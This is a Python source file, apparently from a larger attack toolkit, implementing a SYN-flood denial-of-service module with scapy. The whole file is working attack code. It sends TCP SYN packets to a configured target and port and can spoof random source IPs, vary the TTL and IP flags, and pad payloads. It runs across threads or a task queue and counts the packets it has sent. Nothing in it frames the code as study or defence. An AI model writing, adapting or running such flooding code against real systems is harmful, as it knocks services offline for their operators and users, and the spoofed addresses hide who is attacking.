import asyncio
import random
from scapy.all import IP, TCP, send
from src.attacks.base import AttackBase

class SynFlood(AttackBase):
    async def attack_loop(self):
        print("Starte SYN-Flood Angriff mit IP-Spoofing...")
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                src_ip = self._get_random_ip() if self.config.use_ip_spoofing else None
                src_port = self._get_random_port()
                ttl = self._get_random_ttl() if self.config.ttl_variation else None
                flags = self._get_random_ip_flags() if self.config.randomize_ip_flags else None
                packet_size = self._get_random_packet_size()
                payload = self._add_packet_padding(packet_size)
                ip_params = {"dst": self.config.target}
                if src_ip:
                    ip_params["src"] = src_ip
                if ttl:
                    ip_params["ttl"] = ttl
                if flags is not None:
                    ip_params["flags"] = flags
                if self.task_queue:
                    await self.task_queue.put((
                        lambda ip=ip_params, sp=src_port, dp=self.config.port, pl=payload: 
                        send(
                            IP(**ip) /
                            TCP(sport=sp, dport=dp, flags="S", seq=random.randint(0, 2**32-1)) /
                            pl,
                            verbose=False
                        ),
                        ()
                    ))
                else:
                    await loop.run_in_executor(
                        executor,
                        lambda: send(
                            IP(**ip_params) /
                            TCP(sport=src_port, dport=self.config.port, flags="S", seq=random.randint(0, 2**32-1)) /
                            payload,
                            verbose=False
                        )
                    )
                self.stats.update_sent(1, len(payload) + 40)
                await asyncio.sleep(0.001)
